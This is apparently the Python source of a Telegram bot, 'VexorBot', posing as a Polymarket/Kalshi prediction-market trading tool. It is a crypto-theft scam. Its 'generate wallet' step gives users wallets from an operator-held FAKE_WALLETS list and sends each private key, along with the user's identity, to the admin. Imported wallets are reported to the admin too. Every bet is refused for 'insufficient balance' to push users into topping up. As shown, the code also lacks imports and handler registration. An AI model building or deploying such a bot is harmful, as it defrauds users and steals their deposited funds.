import random
import asyncio
import warnings
import os
from dotenv import load_dotenv

from fastapi import FastAPI, Request, HTTPException
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
    CallbackQueryHandler,
    Application,
)
from telegram.warnings import PTBUserWarning

import get_btc

# ────────────────────────────────────────────────
# Load environment variables (Render injects these)
# ────────────────────────────────────────────────
load_dotenv()  # Only needed locally; Render uses env vars directly

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_STR = os.getenv("ADMIN_ID")
FAKE_WALLETS_STR = os.getenv("FAKE_WALLETS")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN missing!")
if not ADMIN_ID_STR:
    raise ValueError("ADMIN_ID missing!")

ADMIN_ID = int(ADMIN_ID_STR)

if not FAKE_WALLETS_STR:
    raise ValueError("FAKE_WALLETS missing!")

# Parse fake wallets as dictionary: address → private_key
fake_wallets_dict = {}
for pair in FAKE_WALLETS_STR.split(","):
    pair = pair.strip()
    if ":" not in pair:
        continue
    address, privkey = pair.split(":", 1)
    address = address.strip()
    privkey = privkey.strip()
    if address and privkey:
        fake_wallets_dict[address] = privkey

if not fake_wallets_dict:
    raise ValueError("No valid address:private_key pairs found in FAKE_WALLETS")

warnings.filterwarnings("ignore", category=PTBUserWarning)

# States
CHOOSE_SERVICE, WALLET_MODE, SETUP_WALLET, DASHBOARD, ASK_SIDE, ASK_AMOUNT, CONFIRM_BET = range(7)

# ────────────────────────────────────────────────
# FastAPI app
# ────────────────────────────────────────────────
app = FastAPI()

# Build the application (no polling)
application: Application = (
    ApplicationBuilder()
    .token(BOT_TOKEN)
    .get_updates_connection_pool_size(10)
    .connection_pool_size(10)
    .build()
)


# ────────────────────────────────────────────────
# Your existing handlers (unchanged)
# ────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Polymarket Bot", callback_data="poly")],
        [InlineKeyboardButton("Kalshi Bot", callback_data="kalshi")],
    ]

    await update.message.reply_text(
        "Welcome to VexorBot 🚀\n\nChoose a prediction market platform:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )
    return CHOOSE_SERVICE


async def service_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    context.user_data["platform"] = query.data

    keyboard = [
        [InlineKeyboardButton("Generate Wallet", callback_data="generate")],
        [InlineKeyboardButton("Import Wallet", callback_data="import")],
    ]

    await query.edit_message_text(
        f"You selected: {query.data.upper()}\n\nChoose wallet option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )
    return WALLET_MODE


async def wallet_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    mode = query.data

    if mode == "generate":
        address, private_key = random.choice(list(fake_wallets_dict.items()))

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                f"🆕 Generated Fake Wallet\n\n"
                f"User: @{query.from_user.username or 'no-username'}\n"
                f"ID: {query.from_user.id}\n\n"
                f"Address: <code>{address}</code>\n\n"
                f"Private Key: <code>{private_key}</code>"
            ),
            parse_mode="HTML"
        )

        instruction_text = (
            "Long-press the wallet address above to copy it.\n\n"
            "You can now paste it into your wallet app or use it as needed.\n\n"
            
        )

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=(
                "<✅ Wallet Generated Successfully!\n\n"
                f"Wallet Address:\n\n"
                f"{address}\n\n"
                f"Private Key:\n\n"
                f"{private_key}\n\n"
                f"{instruction_text}"
            ),
            parse_mode="HTML",
            disable_web_page_preview=True
        )

        await asyncio.sleep(1)
        await show_dashboard(update, context)
        return DASHBOARD

    if mode == "import":
        await query.edit_message_text(
            "Please send your wallet address to connect:",
            parse_mode="HTML"
        )
        return SETUP_WALLET


async def receive_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallet = update.message.text.strip()
    platform = context.user_data.get("platform", "unknown")

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🆕 Wallet Connected\n\n"
             f"Platform: {platform}\n\n"
             f"User: @{update.effective_user.username or 'no-username'}\n"
             f"ID: {update.effective_user.id}\n"
             f"Wallet: {wallet}",
        parse_mode="HTML"
    )

    await update.message.reply_text(
        "✅ Wallet connected successfully!",
        parse_mode="HTML"
    )
    await show_dashboard(update, context)
    return DASHBOARD


async def ask_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    try:
        amount = float(text)
        if amount < 1:
            await update.message.reply_text(
                "Minimum bet is 1 USDC.\n\nPlease try again.",
                parse_mode="HTML"
            )
            return ASK_AMOUNT
    except ValueError:
        await update.message.reply_text(
            "Please send a valid number (e.g. 50 or 100.5)",
            parse_mode="HTML"
        )
        return ASK_AMOUNT

    side = context.user_data.get('bet_side', 'Unknown')
    await update.message.reply_text(
        f"You wanted to bet ${amount:.2f} on {side}\n\n"
        "But you have an Insufficient balance!\n\n"
        "Top up your wallet or try a smaller amount.",
        parse_mode="HTML"
    )

    context.user_data.pop("bet_side", None)
    await show_dashboard(update, context)
    return DASHBOARD


async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📊 BTC 15m Markets", callback_data="view_markets")],
        [InlineKeyboardButton("❌ Disconnect", callback_data="cancel")],
    ]

    text = "Vexor Prediction Terminal\n\nChoose an option:"

    chat_id = update.callback_query.message.chat_id if update.callback_query else update.effective_chat.id

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == "view_markets":
        platform = context.user_data.get("platform", "poly")

        if platform == "poly":
            prediction_text = get_btc.get_btc_prediction_text()

            keyboard = [
                [InlineKeyboardButton("⬅ Back", callback_data="back")],
                [InlineKeyboardButton("Place a Bet", callback_data="bet")],
            ]

            await query.edit_message_text(
                prediction_text or "No BTC market data available right now.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        else:
            keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="back")]]
            await query.edit_message_text(
                "Kalshi markets coming soon... 🔜",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="HTML"
            )
        return DASHBOARD

    elif data == "bet":
        keyboard = [
            [InlineKeyboardButton("Up (YES) 🚀", callback_data="bet_yes")],
            [InlineKeyboardButton("Down (NO) 📉", callback_data="bet_no")],
            [InlineKeyboardButton("Cancel", callback_data="back")],
        ]

        await query.edit_message_text(
            "Do you want to bet that BTC will go Up or Down in the next 15 minutes?",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="HTML"
        )
        return ASK_SIDE

    elif data in ("bet_yes", "bet_no"):
        context.user_data["bet_side"] = "YES" if data == "bet_yes" else "NO"
        side_text = "Up (YES)" if data == "bet_yes" else "Down (NO)"

        await query.edit_message_text(
            f"Okay! How much USDC do you want to spend on {side_text} ?\n\n"
            "Just send a number (e.g. 50 or 100.5)\n\n"
            "Minimum bet: 1 USDC",
            parse_mode="HTML"
        )
        return ASK_AMOUNT

    elif data == "back":
        await show_dashboard(update, context)
        return DASHBOARD

    elif data == "cancel":
        await query.edit_message_text(
            "Session closed.",
            parse_mode="HTML"
        )
        return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await update.callback_query.edit_message_text(
            "Session closed.",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            "Session closed.",
            parse_mode="HTML"
        )
    return ConversationHandler.END


# ────────────────────────────────────────────────
# FastAPI routes
# ────────────────────────────────────────────────

@app.post("/webhook")
async def webhook(request: Request):
    if request.headers.get("content-type") == "application/json":
        json_data = await request.json()
        update = Update.de_json(json_data, application.bot)
        await application.process_update(update)
        return {"ok": True}
    raise HTTPException(status_code=400)


@app.get("/")
async def health_check():
    return {"status": "alive"}


# ────────────────────────────────────────────────
# Startup event – set webhook once
# ────────────────────────────────────────────────

@app.on_event("startup")
async def startup_event():
    # Render provides the external hostname automatically
    await application.initialize()
    await application.start()
    domain = os.getenv("RENDER_EXTERNAL_HOSTNAME")
    if domain:
        webhook_url = f"https://{domain}/webhook"
        await application.bot.set_webhook(webhook_url)
        print(f"Webhook set to: {webhook_url}")
    else:
        print("Warning: RENDER_EXTERNAL_HOSTNAME not found – webhook not set automatically")


# ────────────────────────────────────────────────
# Main – start the FastAPI server
# ────────────────────────────────────────────────

if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", 10000))  # Render provides $PORT
    uvicorn.run(app, host="0.0.0.0", port=port)
